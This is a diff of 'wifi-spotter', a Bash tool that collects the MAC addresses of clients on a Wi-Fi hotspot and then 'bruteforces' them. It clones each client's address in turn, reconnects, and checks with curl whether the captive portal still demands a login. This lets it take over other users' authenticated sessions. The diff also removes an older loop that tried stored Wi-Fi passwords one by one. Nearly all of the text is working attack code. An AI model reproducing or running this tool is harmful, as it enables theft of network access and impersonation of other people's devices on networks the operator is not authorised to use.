@@ -5,7 +5,7 @@
 							trap "echo terminated by user; _trap_cleanup; exit 1" SIGINT SIGTERM
 						_process_usage()
 										{
-											local msg1 msg2 msg3 msg4
+											local msg1 msg2 msg3 msg4 msg5
 											msg1="Usage: wifi-spotter [options]\n"
 											msg1+=" Experience network testing in advanced manner.\n\n"
 											msg1+="Parameters:\n"
@@ -30,20 +30,24 @@
 											msg4="Available Wi-Fi connect options:\n"
 											msg4+="   a, Auto (Auto network discovery)\n"
 											msg4+="   f, Fast (Fast network discovery)\n"
-											msg4+="   p, Pin (Pin network discovery)\n"
 											msg4+="   c, Connect (Connect to selected network)\n"
 											msg4+="   s, Survival (Survive network connection)\n"
 											msg4+="   n, Count (Count available clients requests)\n"
 											msg4+="   x, Target (Bruteforce connected clients)\n"
-											msg4+="   xx, Target (Bruteforce connected clients)\n"
 											msg4+="   t, Test (Perform eligibility test)\n"
 											msg4+="   r, Reset (Remove all saved networks)\n"
 											msg4+="     Example: wifi-spotter -ct"
 
+											msg5="Available quick options:\n"
+											msg5+="   r, reconnect (Reconnect into current network).\n"
+											msg5+="   m, random (Set random address and reconnect).\n"
+											msg5+="   xx:xx:xx:xx:xx:xx (Set passed address and reconnect).\n"
+											msg5+="     Example: wifi-spotter CA:01:23:45:67:89"
+
 
 												_echo "$msg1" 1
 											if [[ "$1" = "a"* ]]; then
-												_echo "\n$msg2\n\n$msg3\n\n$msg4" 1
+												_echo "\n$msg2\n\n$msg3\n\n$msg4\n\n${msg5}" 1
 											elif [[ "$1" = "s"* ]]; then
 												_echo "\n$msg2" 1
 											elif [[ "$1" = "m"* ]]; then
@@ -62,11 +66,11 @@
 																		if [ "$mode" = "parse" ]; then
 																			return 1
 																		elif [ "$mode" = "connect" ]; then
-																			_json_initconfig || return 1; _json_networkinfoauto; _json_networkpskauto
+																			_json_initconfig || return 1; _json_networkclients "xclients"; _json_networkclients "tclients"; _json_networkclients "admins"
 																		elif [ "$mode" = "scan" ]; then
-																			_json_initconfig || return 1; _json_networkinfo; _json_networkgid; _json_networkclients
+																			_json_initconfig || return 1; _json_networkclients "clients"
 																		elif [ "$mode" = "mointor" ]; then
-																			_json_initconfig || return 1; _json_networkinfo; _json_networkgid; _json_networkclients; _json_networkndp
+																			_json_initconfig || return 1; _json_networkclients "clients"; _json_networkndp
 																		else
 																			_echo "_trap_cleanup: error unknown mode is set: ${mode}" 0
 																		fi
@@ -155,7 +159,7 @@
 																		_organize_clients()
 																						{
 																								local i x list
-																								_validate_address "${@}" || { _echo "\t\t_json_networkclients --> error clients list is empty: [clients](${clients}) [result[0]](${result[0]})" 0; return 1; }
+																								_validate_address "${@}" || { _echo "\t\t_json_networkclients --> error clients list is empty: [${sub}](${@}) [result[0]](${result[0]})" 0; return 1; }
 																							for x in ${result[0]}; do
 																									i=$((i+1))
 																								if [ ${i} -eq 1 ]; then
@@ -170,16 +174,50 @@
 																									unset result
 																									result="${list}"
 																						}
-																			local b arr tmp
-																			[ ${#clients} -eq 0 ] && return 0
+																			local e b arr tmp sub
+																		if ([ ${#clients} -ne 0 ] || \
+																			[ ${#tclients} -ne 0 ] || \
+																			[ ${#xclients} -ne 0 ] || \
+																			[ ${#admins} -ne 0 ]); then
+																			true
+																		else
+																			return 0
+																		fi
 																			_validate_address "${iwbssid[1]}" || { _echo "\t\t_json_networkclients --> error iwbssid is invalid: [iwbssid](${iwbssid[1]})" 0; return 1; }
-																			_organize_clients "${clients}"
 
-																			tmp=$(mktemp)
-																		if ! (jq --arg b "${iwbssid[1]}" \
+																		if [ "${1}" = "admins" ]; then
+																			sub="admins"
+																			_organize_clients "${admins}" || return 1
+																		elif [ "${1}" = "tclients" ]; then
+																			sub="tclients"
+																			_organize_clients "${tclients}" || return 1
+																		elif [ "${1}" = "xclients" ]; then
+																			sub="xclients"
+																			tbssid+=",\"${iwbssid[1]}\""
+																			[ "${tbssid: -1}" = "," ] && tbssid="${tbssid:0: -1}"
+																			[ "${tbssid:0:1}" = "," ] && tbssid="${tbssid:1}"
+																			_organize_clients "${xclients}" || return 1
+																		else
+																			sub="clients"
+																			_organize_clients "${clients}" || return 1
+																		fi
+
+																			tmp=$(mktemp); e=0
+																		if [ "${sub}" = "xclients" ]; then
+																			if ! (jq --arg b "${iwbssid[1]}" \
 																				--argjson arr "${result}" \
-																				'.ws.bssid.[$b].clients |= (. + $arr | unique)' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
-																			_echo "\t\t_json_networkclients --> error could not save info: [iwbssid](${iwbssid[1]}) [clients](${clients}) [result](${result})" 0
+																				'.ws.bssid.[$b]."xclients" |= (. + $arr | unique) | .ws.bssid.['${tbssid}']."clients" |= (. - $arr | unique)' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
+																				e=1
+																			fi
+																		else
+																			if ! (jq --arg b "${iwbssid[1]}" \
+																				--argjson arr "${result}" \
+																				'.ws.bssid.[$b].'${sub}' |= (. + $arr | unique)' "$db_file" >"${tmp}" && mv "${tmp}" "${db_file}"); then
+																				e=1
+																			fi
+																		fi
+																		if [ ${e} -ne 0 ]; then
+																			_echo "\t\t_json_networkclients --> error could not save info: [iwbssid](${iwbssid[1]}) [${sub}](${result})" 0
 																		fi
 																}
 														_json_networkgid()
@@ -233,41 +271,6 @@
 																			_echo "\t\t_json_networkinfoauto --> error could not save info: (${list_wifi_json})" 0
 																		fi
 																}
-														_json_networkpskauto()
-																{
-																			local tmp data
-																		if [ -z "${list_psk_json}" ]; then
-																			return 1
-																		fi
-																			tmp=$(mktemp)
-																			#if ! (jq --argjson data "'{\"psk\":{${list_psk_json}}}'" '. as $orig | .ns += $data | reduce paths(arrays) as $p (.; setpath($p; ($orig | getpath($p)) + getpath($p) | unique))' "$db_file" >"${tmp}" \
-																		if ! (jq --argjson data "{\"psk\":{${list_psk_json}}}" 'reduce ($data | keys[]) as $k (.; .ws.[$k] += $data[$k])' "${db_file}" >"${tmp}" \
-																				&& mv "${tmp}" "${db_file}"); then
-																			_echo "\t\t_json_networkpskauto --> error could not save info: (${list_psk_json})" 0
-																		fi
-																}
-														_json_addressgid()
-																{
-																		local tmp c error
-																	if [ "${#bssid}" -lt "17" ]; then
-																		_echo "\t\t_json_addressgid --> error bssid equals: ${bssid}" 0
-																		return 1
-																	fi
-																		tmp=$(mktemp)
-																		c=$(jq --arg b "${bssid}" --arg p "${2}" '.ws.bssid.[$b] | has($p)' "${db_file}")
-																	if [ "${c}" = "false" ]; then
-																		jq --arg b "${bssid}" --arg x "${1}" --arg p "${2}" '.ws.bssid.[$b] +={$p:[$x]}' "${db_file}" >"${tmp}" && \
-																			mv "${tmp}" "${db_file}" || error="yes"
-																	elif [ "${c}" = "true" ]; then
-																		jq --arg b "${bssid}" --arg x "${1}" --arg p "${2}" '.ws.bssid.[$b].[$p] += ([$x] | unique)' "${db_file}" >"${tmp}" && \
-																			mv "${tmp}" "${db_file}" || error="yes"
-																	else
-																		error="yes"
-																	fi
-																	if [ "${error}" = "yes" ]; then
-																		_echo "_json_addressgid --> error could not save: ${1} into: ${bssid}(gid:${gid})" 0
-																	fi
-																}
 														_validate_storage()
 																{
 																	if [ ! -d "${home_dir}" ]; then
@@ -304,10 +307,10 @@
 												local db_struct db_file db_filename home_dir log_file hum_date bot_date option help scan_option monitor_option args connect_option version commit confirm_update
 												db_struct='{"ws":{"bssid":{},"gid":{}}}'
 												home_dir=~/wifi-spotter-root
-												db_filename="wsdb"
+												db_filename="wsdb_43"
 												db_file="${home_dir}/${db_filename}.json"
 												log_file="${home_dir}/logs/ws.log"
-												full_date=($(date "+%y%m%d%H%M%S %d%m%y date: %d-%m-%Y time: %H:%M:%S"))
+												full_date=($(date "+%s %d%m%y date: %d-%m-%Y time: %H:%M:%S"))
 												hum_date="${full_date[@]:2}"
 												bot_date="${full_date[0]}"
 												obf_date="${full_date[1]}"
@@ -319,7 +322,7 @@
 											while getopts i:c:s:m:p:h:gv option; do
 												case "$option" in
 													i) iface="${OPTARG}";;
-													c) [ -z "$mode" ] && { mode="connect"; if [ "${OPTARG:0:2}" = "xx" ]; then connect_option="xx"; else connect_option="${OPTARG:0:1}"; fi; } || { mode="many"; break; };;
+													c) [ -z "$mode" ] && { mode="connect"; connect_option="${OPTARG:0:1}"; } || { mode="many"; break; };;
 													s) [ -z "$mode" ] && { mode="scan"; scan_option="${OPTARG:0:1}"; } || { mode="many"; break; };;
 													m) [ -z "$mode" ] && { mode="mointor"; mointor_option="${OPTARG:0:1}"; } || { mode="many"; break; };;
 													p) [ -z "$mode" ] && { mode="parse"; input_file="${OPTARG}"; } || { mode="many"; break; };;
@@ -343,9 +346,16 @@
 											fi
 
 												# environment check
-											if [ -s "${home_dir}/logs/_init_env.log" ]; then
 												source "${home_dir}/.wsprofile"
-												echo >"${home_dir}/logs/_init_env.log"
+
+												# database rollback
+											if ([ -n ${ws_ver} ] && [ ${ws_ver} -ge 43 ] && [ ! -s "${home_dir}/wsdb_43.json" ]); then
+												if [ -s "${home_dir}/wsdb.json" ]; then
+													# starting from v4.3-b1 db renamed from wsdb into wsdb_43
+													# db must be cleared once since it's may contain invalide data inserted by old versions.
+													cp "${home_dir}/wsdb.json" "${home_dir}/wsdb_43.json"
+													"${home_dir}/plugins/database-merger.sh" --clear || { echo "Error: clear db failed !"; rm -f "${home_dir}/wsdb_43.json"; exit 1; }
+												fi
 											fi
 
 											if [ "$(id -u)" = "0" ]; then
@@ -371,10 +381,13 @@
 											elif [ -n "${input_file}" ]; then
 												mode="parse"
 												[ -s "${input_file}" ] || { _echo "Error cannot read: ${input_file}" 1; return 1; }
-											elif [ "${#1}" = "17" ]; then
+											elif [ "${#1}" = "17" ] || [ "${#1}" = "18" ]; then
 												_process_connect "quick_setaddr" "${1}"
 												return ${?}
-											elif [[ "${1}" = "r" ]]; then
+											elif [ "${1}" = "reconnect" ] || [ "${1}" = "r" ]; then
+												_process_connect "reconnect"
+												return ${?}
+											elif [ "${1}" = "random" ] || [ "${1}" = "m" ]; then
 												_process_connect "quick_setaddr" "--random"
 												return ${?}
 											else
@@ -385,7 +398,7 @@
 											if [ "$mode" = "parse" ]; then
 												_process_parse
 											elif [ "$mode" = "connect" ]; then
-												[[ ! "$connect_option" =~ (a|f|p|c|s|n|x|t|r) ]] && { _echo "$connect_option is invalid connect option\nTip: Use -h connect to list available connect options." 1; return 1; }
+												[[ ! "$connect_option" =~ (a|f|c|s|n|x|t|r) ]] && { _echo "$connect_option is invalid connect option\nTip: Use -h connect to list available connect options." 1; return 1; }
 												#_process_networkinfo || return 1
 												_process_connect "${connect_option}"
 											elif [ "$mode" = "scan" ]; then
@@ -449,6 +462,7 @@
 														[ ${err} -ne 0 ] && { _echo "\tError ${err}: reading info failed !" 1; return 1; }
 
 											_echo "- Network Information:\n\tSSID: ${iwssid[1]}\n\tBSSID: ${iwbssid[1]}\n\tFrequency: ${iwfreq[1]}\n\tGID: ${gid:0:12}\n\tYour IP-Address: $devip\n\tYour MAC-Address: ${addr[2]}\n\tGateway: $gateway\n\tRoute: $route\n\tServer-Domain: $domain\n\tServer-Address: ${host}:${port}" 1
+												_json_initconfig && _json_networkinfo && _json_networkgid
 												return 0
 										}
 						_process_scan()
@@ -526,7 +540,7 @@
 											done< <($stdin)
 												_echo "\tScan completed found: ${i[1]} devices" 1
 												_echo "\t\t_parse_arpscan --> scan completed: total(${i[0]}) filtered(${i[1]})" 0
-												clients="${list}"
+												unset clients; clients="${list}"
 												_count_and_notify "${i[1]}"; return ${?}
 										}
 							_parse_iproute()
@@ -698,44 +712,14 @@
 																		sleep 1.0
 																		return 0
 																	elif [ "${mode}" = "get_wifi_info" ]; then
-																			ssid=$(echo "${u}" | grep -Po "SSID: \K[^,]*" | sed -n 1p)
-																		if [ -z "${ssid}" ]; then
-																			return 1
-																		else
-																			bssid=$(echo "${u}" | grep -Po "BSSID: \K[^,]*" | sed -n 1p)
-																			ssid="${ssid:1:-1}"
-																			[[ "${ssid}" =~ "'" ]] && ssid="${ssid//\'/\&squot;}"
-																			[[ "${ssid}" =~ '"' ]] && ssid="${ssid//\"/\&quot;}"
-																			[[ "${ssid}" =~ '\' ]] && ssid="${ssid//\\/\&bslash;}"
-																			ssid="\"${ssid}\""
-																		fi
-																			sec=$(echo "${u}" | grep -Po "Security type: \K[^,]*" | sed -n 1p)
-																		if [ "${sec}" = "0" ]; then
-																			sec="open"
-																		elif [ "${sec}" = "1" ]; then
-																			sec="wep"
-																		elif [ "${sec}" = "2" ]; then
-																			sec="wpa2"
-																		elif [ "${sec}" = "3" ]; then
-																			sec="wpa3"
-																		else
-																			return 2
-																		fi
-																			return 0
+																		_connection_interface_getinfo "${iface}" "${prefix}" &>>"${log_file}"; err=${?}
+																		[ ${err} -eq 0 ] && return 0 || { _echo "\t${color_error}Failed to get info: ${err}${color_reset}" 1; return ${err}; }
+																	elif [ "${mode}" = "reconnect" ]; then
+																		_connection_interface_reconnect "${ws_disconnect_alt}" "${iface}" "${prefix}" &>>"${log_file}"; err=${?}
+																		[ ${err} -eq 0 ] && return 0 || { _echo "\t${color_error}Failed to reconnect: ${err}${color_reset}" 1; return ${err}; }
 																	elif [ "${mode}" = "is_disconnected" ] && [[ "${u}" =~ "Wifi is connected to" ]]; then
-																		if [ "${ws_disconnect_alt}" = "0" ] || [ "${ws_disconnect_alt}" = "1" ] || [ "${ws_disconnect_alt}" = "2" ]; then
-																			y="${ws_disconnect_alt}"
-																		else
-																			y="2"
-																		fi
-																			_connection_interface_disconnect "${y}" "${iface}" "${prefix}" &>>"${log_file}"; err=${?}; result="${ret}"
-
-																		if [ ${err} -ne 0 ]; then
-																			_echo "${color_error}Unexpected error: ${result}${color_reset}" 1
-																			return 1
-																		else
-																			return 0
-																		fi
+																		_connection_interface_disconnect "${ws_disconnect_alt}" "${iface}" "${prefix}" &>>"${log_file}"; err=${?}
+																		[ ${err} -eq 0 ] && return 0 || { _echo "\t${color_error}Failed to disconnect: ${err}${color_reset}" 1; return ${err}; }
 																	fi
 																}
 											_wificonnect_getinfo()
@@ -856,26 +840,20 @@
 																				i=$((i+1))
 																		done
 																				return 0
+																				_json_initconfig || return 1; _json_networkinfoauto
 																	done
+																		return 1
 																}
 											_wificonnect_connect()
 																{
-																		local ssid sec bssid psk err i
+																		local ssid sec bssid err i
 																		ssid="${1}"; sec="${2}"; bssid="${3}"
 																	if [[ "${ssid}" =~ (hidden_ssid_*) ]]; then
 																		_echo "\t${color_error}Not supported yet connecting to:${color_reset} ${ssid}" 1
 																		return 1
 																	fi
-																	if [ "${sec}" = "open" ]; then
+
 																		_connection_interface_connect "${ssid:1:-1}" "${sec}" &>>"${log_file}"; err=${?}
-																	else
-																			i=0
-																		while read -r psk; do
-																			[ -z "${psk}" ] && continue; i=$((i+1))
-																			_connection_interface_connect "${ssid:1:-1}" "${sec} ${psk}" &>>"${log_file}" && { err=${?}; break; } || { err=${?}; continue; }
-																		done< <(jq --arg s "${ssid:1:-1}" '.ws.psk.[$s]' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/\,//g; s/\"//g')
-																		[ ${i} -eq 0 ] && err=3
-																	fi
 																	if [ ${err} -eq 0 ]; then
 																		_echo "\t${color_success}Connection succedd: ${ssid}${color_reset}" 1
 																		return 0
@@ -897,7 +875,7 @@
 																			if [ "${wifi_force_select}" = "yes" ]; then
 																				_echo "\t\t_wificonnect_select --> manually wifi connect mode is requested" 0
 																			elif [ -n "${cur_bssid}" ]; then
-																				_wificonnect_status "get_wifi_info" && return 0 || return 1
+																				_wificonnect_status "get_wifi_info" && return 0 || return ${?}
 																			fi
 																				_wificonnect_getinfo || return 1
 																		fi
@@ -924,138 +902,94 @@
 																}
 											_wificonnect_getclients()
 																{
-																		_merge_gid()
-																						{
-																								local tmp x y c g; y=0
-																								tmp=$(mktemp)
-																								_remove_gid()
-																										{ jq --arg k "$1" 'del(.ws.gid.[$k])' "${db_file}" >"${tmp}" && mv "${tmp}" "${db_file}" && _echo "\t\t_remove_gid --> removing succedd: ${1}" 0 || _echo "\t\t_remove_gid --> error could not remove: ${1}" 0; }
-																							for x in ${z}; do
-																									c="$(jq -r --arg k "$x" '.ws.gid.[$k].stamp' "${db_file}" 2>&1 || echo error)"
-																									[ $y -eq 0 ] && g="$x"
-																								if [[ "$c" =~ "error" ]] || [ -z "$c" ]; then
-																									_echo "\t\t_merge_gid --> Unexpected error occurred: [c](${c})" 0
-																									return 1
-																								fi
-																								if [ $c -eq $y ]; then
-																									_echo "\t\t_merge_gid --> $c are equal to $y" 0
-																								elif [ $c -gt $y ]; then
-																									_echo "\t\t_merge_gid --> $c are greater than $y" 0
-																									[ $y -ne 0 ] && _remove_gid "$x"; y="$c"; z="$g"
-																								elif [ $c -lt $y ]; then
-																									_echo "\t\t_merge_gid --> $c are less than $y" 0
-																									_remove_gid "$x"
-																								else
-																									_echo "\t\t_merge_gid --> Unexpected error occurred: [c](${c}) [y](${y})" 0
-																									return 1
-																								fi
-																							done
-																									z="$g"; return 0
-																						}
-																		_parse_gid()
-																						{
-																								local c tbssid_list gid_init
-																								tbssid_list="${@}"
-																							if [ "${#gid}" -eq 32 ]; then
-																								gid_list="\"${gid}\""
-																								gid_init="yes"
-																								i[3]=$((i[3]+1))
-																							else
-																								gid_init="no"
-																							fi
-																								_echo "\tGetting GID..." 1
-																							for x in ${tbssid_list}; do
-																									#_echo "\tCBSSID: ${x}" 1
-																									c=0; i[1]=$((i[1]+1))
-																								while read y; do
-																									[ $c -eq 0 ] && z="$y" || z="$z $y"
-																									c=$((c+1))
-																								done< <(cat "${db_file}" | jq --arg k "$x" '.ws.gid | paths(type=="array") as $p | select(getpath($p) | index([$k])) | $p' | sed '/\[/d; /\]/d; /list/d; /null/d; s/[\",]//g' 2>&1)
-																									if [  "$c" -eq 1 ]; then
-																										[[ "${gid_list}" != *"${z}"* ]] && { gid_list+=",\"${z}\""; i[3]=$((i[3]+1)); }
-																									elif [  "$c" -ge 2 ]; then
-																										_merge_gid || return 1
-																										[[ "${gid_list}" != *"${z}"* ]] && { gid_list+=",\"${z}\""; i[3]=$((i[3]+1)); }
-																									else
-																										continue
-																									fi
-																							done
-																										i[1]=$((i[1]-i[0]))
-																										# fix when gid_list is not intited
-																									if [ "${gid_init}" = "no" ] && [ "${gid_list:0:1}" = "," ]; then
-																										gid_list="${gid_list:1}"
-																									fi
-																						}
-																			_debug_reqs()
-																						{
-																							if [ "${debug_bruteforce_target}" = "tclients" ]; then
-																									max_reqs=0
-																								for x in $(cat "${db_file}" | jq --arg k "${bssid}" '.ws.bssid.[$k].tclients' | tr -d ' [],"' | sort | uniq | tr '\n' ' '); do
-																									reqs_list+=" ${x}"
-																									max_reqs=$((max_reqs+1))
-																								done
-																							elif [ "${debug_bruteforce_target}" = "admins" ]; then
-																									max_reqs=0
-																								for x in $(cat "${db_file}" | jq --arg k "${bssid}" '.ws.bssid.[$k].admins' | tr -d ' [],"' | sort | uniq | tr '\n' ' '); do
-																									reqs_list+=" ${x}"
-																									max_reqs=$((max_reqs+1))
-																								done
-																							else
-																									max_reqs=0
-																								for x in ${debug_bruteforce_target}; do
-																									reqs_list+=" ${x}"
-																									max_reqs=$((max_reqs+1))
-																								done
-																							fi
-																							if [ -z "${max_reqs}" ]; then
-																								return 1
-																							fi
-																						}
-
-																			local c x y z list i exclude bssidx_list prev_clients
+																			local c x y z list i exclude addr clients_list exclude_list xclients_list vendor_list vclients_list fclients_list index
 
 
 																			_echo "- Starting to target Wi-Fi:" 1
 
-																			# xbssid, cbssid, tbssid, gid, filter, request
-																			i=(0 0 0 0 0 0)
-																		if [ -n "${debug_bruteforce_target}" ]; then
-																			_debug_reqs && return 0 || return 1
-																		elif [ "${parse_gid_mode}" = "seperate" ]; then
-																			i[0]=0
-																			_parse_gid "${bssid}"
-																		elif [ "${parse_gid_mode}" = "position" ] || \
-																				[ "${parse_gid_mode}" = "index" ]; then
-																			if [ -s "${home_dir}/logs/bssidx.log" ]; then
-																				i[0]=$(cat "${home_dir}/logs/bssidx.log" | tr ' ' '\n' | sort | uniq | wc -l)
-																				bssidx_list=$(cat "${home_dir}/logs/bssidx.log" | tr " " "\n" | sort | uniq | tr "\n" " ")
+																			# cbssid, tbssid, requests, filtered
+																			i=(0 0 0 0)
+																			
+																			_echo "\tGetting list..." 1
+																		if [ "${#gid}" -eq 32 ]; then
+																			if [ ${#bssid_list[@]} -ge 1 ]; then
+																				i[0]="${#bssid_list[@]}"
 																			else
-																				i[0]=0
+																				i[0]=1
 																			fi
-																				_parse_gid "${bssid_list[@]} ${bssidx_list}"
+																		else
+																			_echo "\tError: GID length is incorrect: ${#gid}" 1
+																			return 1
 																		fi
-
-
-																		_echo "\tGetting requests..." 1
+																			unset tbssid
 																	while read y; do
-																		if [ ${i[2]} -eq 0 ]; then
+																			tbssid+=",\"${y}\""
+																		if [ ${i[1]} -eq 0 ]; then
 																			list="\"${y}\""
 																		else
 																			list+=",\"${y}\""
 																		fi
-																			i[2]=$((i[2]+1))
-																	done< <(cat "${db_file}" | jq '.ws.gid.['$gid_list'].list' | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g')
-																		_echo "\tFiltering requests..." 1
-																		exclude="00:00:00 ff:ff:ff 00:07:89 00:30:4c 00:e0:4c 18:e8:29 1c:3b:f3 24:5a:4c 24:a4:3c 28:87:ba 3c:84:6a 40:a5:ef 48:22:54 60:29:d5 68:72:51 68:ff:7b 78:8a:20 80:2a:a8 88:3c:1c 9c:a2:f4 ac:15:a2 b4:a9:4f b4:fb:e4 c0:c9:e3 e4:38:83 f0:9f:c2 f4:92:bf f4:e2:c6"
-																		prev_clients=$(jq '.ws.bssid.['$list'].["admins","tclients"]' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | tr "\n" " ")
-																	while read y; do
-																		[[ "${exclude}" =~ "${y:0:8}" ]] || ([ "${ws_interface_allows}" = "even" ] && [[ "${y:0:2}" =~ (1|3|5|7|9|B|b|D|d|F|f) ]]) || ([ -f "${home_dir}/logs/creds_${obf_date}.log" ] && [[ "${prev_clients,,}" =~ "${y,,}" ]]) && { i[4]=$((i[4]+1)); continue; }
-																		reqs_list+=" ${y}"
-																		i[5]=$((i[5]+1))
-																	done< <(jq '.ws.bssid.['$list'].clients' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | shuf)
-																			_echo "\tTotal XBSSID: ${i[0]}\n\tTotal CBSSID: ${i[1]}\n\tTotal TBSSID: ${i[2]}\n\tTotal GID: ${i[3]}\n\tTotal filtered: ${i[4]}\n\tTotal requests: ${i[5]}" 1
-																			max_reqs="${i[5]}"
-																		if [ ${i[5]} -gt 10 ]; then
+																			i[1]=$((i[1]+1))
+																	done< <(cat "${db_file}" | jq --arg k "${gid}" '.ws.gid.[$k].list' | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g')
+																	vendor_list=$(cat $PREFIX/share/arp-scan/ieee-oui.txt | grep -v "^#" | awk '{print $1}' | awk '{print length, $0}' | sort -n | awk '{print $2}' | tr "\n" " ")
+																	clients_list=$(jq '.ws.bssid.['$list'].clients' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | shuf | tr "\n" " ")
+																	exclude_list=$(jq '.ws.bssid.['$list'].xclients' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | shuf | tr "\n" " ")
+																	tclients_list=$(jq '.ws.bssid.['$list'].["tclients","admins"]' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | shuf | tr "\n" " ")
+
+																		_echo "\tFiltering xclients..." 1
+																		unset xclients
+																	for y in ${exclude_list}; do
+																		if [[ "${tbssid}" =~ "${y}" ]]; then
+																			xclients+=" ${y}"; continue
+																		elif [[ "${tclients_list}" =~ "${y}" ]]; then
+																			continue
+																		elif ([ "${ws_interface_allows}" = "even" ] && \
+																			[[ "${y:0:2}" =~ (1|3|5|7|9|B|b|D|d|F|f) ]]); then
+																			continue
+																		fi
+																			addr="${y//:/}"; addr="${addr:0:6}"
+																		if [[ "${vendor_list}" =~ "${addr}" ]]; then
+																			vclients_list+=" ${y}"; continue
+																		fi
+																			xclients+=" ${y}"; xclients_list+=" ${y}"
+																	done
+
+																		_echo "\tFiltering clients..." 1
+																	for y in ${clients_list}; do
+																		if [[ "${tbssid}" =~ "${y}" ]]; then
+																			xclients+=" ${y}"; continue
+																		elif [[ "${tclients_list}" =~ "${y}" ]]; then
+																			continue
+																		elif [[ "${xclients_list}" =~ "${y}" ]]; then
+																			xclients+=" ${y}"; continue
+																		elif ([ "${ws_interface_allows}" = "even" ] && \
+																			[[ "${y:0:2}" =~ (1|3|5|7|9|B|b|D|d|F|f) ]]); then
+																			continue
+																		fi
+																			addr="${y//:/}"; addr="${addr:0:6}"
+																		if [[ "${vendor_list}" =~ "${addr}" ]]; then
+																			vclients_list+=" ${y}"
+																			continue
+																		fi
+																			fclients_list+=" ${y}"
+																	done
+																			unset reqs_list
+																			index[1]=$(echo "${xclients_list}" | wc -w)
+																			index[2]=$(echo "${tclients_list}" | wc -w)
+																			index[3]=$(echo "${vclients_list}" | wc -w)
+																			index[4]=$(echo "${fclients_list}" | wc -w)
+
+																			index[0]=$((index[1]+index[2]+index[3]+index[4]))
+																			i[2]=$((index[3]+index[4])); i[3]=$((index[1]+index[2]))
+																			max_reqs="${index[0]}"
+																		if [ ${i[2]} -eq 0 ]; then
+																			# no more clients left
+																			reqs_list="${fclients_list} ${vclients_list} ${tclients_list} ${xclients_list}"
+																		else
+																			reqs_list="${fclients_list} ${vclients_list} ${xclients_list} ${tclients_list}"
+																		fi
+																			_echo "\tTotal CBSSID: ${i[0]}\n\tTotal TBSSID: ${i[1]}\n\tTotal requests: ${i[2]}\n\tTotal filtered: ${i[3]}" 1
+																		if [ ${max_reqs} -gt 10 ]; then
 																			return 0
 																		else
 																			_echo "\t${color_error}Error current available requests is ${i[2]}${color_reset}" 1
@@ -1064,15 +998,9 @@
 																			return 1
 																		fi
 																}
-											_wificonnect_bruteforce()
+											_wificonnect_getgid()
 																{
-																	local c x y t n r cooldown curr_addr
-																			mode="auto"
-																			_wificonnect_select || return 1
-																			_wificonnect_status "is_disconnected" || return 1
-																			_wificonnect_clear; _macchanger_set "--random" || return 1
-																			_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || return 1
-																			{ _process_networkinfo || return 1; _json_initconfig || return 1; _json_networkinfo; _json_networkgid; }
+																			_process_networkinfo || return 1
 																		if [ "${gid}" = "0" ]; then
 																			_error_msg "Error network GID is: ${gid}" "Tip: No internet connection available !"
 																			return 1
@@ -1080,6 +1008,15 @@
 																			_error_msg "Error host address is: ${host}" "Tip: No internet connection available !"
 																			return 1
 																		fi
+																}
+											_wificonnect_bruteforce()
+																{
+																	local c x y t n r cooldown curr_addr status_tries
+																			_wificonnect_select || return 1
+																			_wificonnect_status "is_disconnected" || return 1
+																			_wificonnect_clear; _macchanger_set "--random" || return 1
+																			_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || return 1
+																			_wificonnect_getgid || return 1
 																			_wificonnect_getclients || return 1
 																			n=0; t=1; cooldown=0
 																	for x in ${reqs_list}; do
@@ -1088,7 +1025,7 @@
 																			{ _wificonnect_status "is_disabled" || return 1; _wificonnect_status "is_disconnected" || return 1; _macchanger_set "${x}" || return 1; }
 																		if ! _wificonnect_connect "${ssid}" "${sec}" "${bssid}"; then
 																			cooldown=$((cooldown+1))
-																			_echo "\t\t_wificonnect_bruteforce --> error connection failed with address: [request_addr](client: ${request_addr})" 0
+																			_echo "\t\t_wificonnect_bruteforce --> error connection failed with address: [request_addr](client: ${x})" 0
 																			[ ${cooldown} -ge 3 ] && { cooldown=0; _echo "\t${color_warn}Bottleneck was hit now cooling down..." 1; _echo "\t\t_wificonnect_bruteforce --> error bottleneck was hit: [tries](${t})" 0; sleep 120; }
 																			continue
 																		fi
@@ -1104,30 +1041,48 @@
 																			_echo "\t\t_wificonnect_bruteforce --> error requested and current address does not match: [current_addr](${curr_addr}) [request_addr](${x})" 0
 																			play-audio "$home_dir/sfx/notification_error.m4a" &
 																			break
-																		else
+																		else	
 																			_wificonnect_macsposed "--disable" "${x}"
 																			cooldown=0
-																			curl -vsLA "${useragent}" "${host}:${port}/${status}" >"${home_dir}/logs/tmp" 2>"${home_dir}/logs/err"
-																			c=$(cat "${home_dir}/logs/err" | tr '\t\r\n*' '#')
+
+																				status_tries=0; unset c
+																			until [ ${status_tries} -ge 3 ]; do
+																				status_tries=$((status_tries+1))
+																				curl -m2 -vsLA "${useragent}" "${host}:${port}/${status}" >"${home_dir}/logs/tmp" 2>"${home_dir}/logs/err"
+																				c=$(cat "${home_dir}/logs/err" | tr '\t\r\n*' '#')
+
+																				if [[ "${c}" =~ "timed out after" ]]; then
+																					c="ERROR: ${c}"
+																					_echo "\t${color_success}Trying again for: ${x}${color_reset}" 1
+																					_wificonnect_status "is_disconnected"
+																					_wificonnect_connect "${ssid}" "${sec}" "${bssid}"
+																				else
+																					break
+																				fi
+																			done
+																			if [ ${status_tries} -ge 3 ]; then
+																				_echo "\t${color_error}Failed requesting for: ${x}${color_reset}" 1
+																			fi
 																		fi
 
-																		if [[ "${c}" =~ (Location: .*login|HTTP/1.1 302 Hotspot login required) ]]; then
+																		if [[ "${c}" =~ "ERROR:" ]]; then
 																			false
+																		elif [[ "${c}" =~ (Location: .*login|HTTP/1.1 302 Hotspot login required) ]]; then
+																			xclients+=" ${x}"
 																		elif [[ "${c}" =~ (Location: .*status|HTTP/1.1 200 OK) ]]; then
+																			tclients+=" ${x}"
 																			n=$((n+1)); r="${color_success}"
